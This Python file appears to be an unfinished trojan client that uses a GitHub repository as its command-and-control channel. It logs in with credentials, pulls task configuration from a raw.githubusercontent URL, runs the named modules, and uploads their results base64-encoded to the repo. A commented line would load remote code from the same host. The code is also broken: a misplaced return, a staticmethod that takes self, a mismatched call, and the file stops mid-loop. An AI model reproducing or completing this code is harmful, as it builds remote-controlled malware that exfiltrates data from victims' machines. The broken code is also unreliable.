#!/usr/bin/env python
import sys
import json
import base64
import random
import Queue
from github3 import login
# from httpimp import add_remote_repo
# add_remote_repo(['toy'], 'https://raw.githubusercontent.com/how2how/toy/master/')
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen


class Boy(object):
    _id = 'abc'
    config_url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/'

    def __init__(self, guser, gpass, repo):
        self.gh = self.repo = self.branch = None
        self.task_queue = Queue.Queue()
        self.connect(guser, gpass, repo)

    def connect(self, u, p, repo):
        self.gh = login(username=u, password=p)
        self.repo = self.gh.repository(u, repo)
        self.branch = self.repo.branch('master')
        return

    def save_result(self, data, msg):
        remote_path = 'data/%s/%d.data' % (
            self._id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, msg, base64.b64encode(data))
    return

    def install(self):
        pass

    @staticmethod
    def get_config(self, config_url):
        try:
            config = urlopen(config_url).read()
            return json.loads(config)
        except Exception:
            return None

    @staticmethod
    def enc(data):
        pass

    @staticmethod
    def dec(data):
        pass

    def run(self, config):
        def worker(m):
            self.task_queue.put(1)
            result = sys.modules[m].run()
            self.task_queue.get()
            self.save_result(result)
            return
        while True:
            
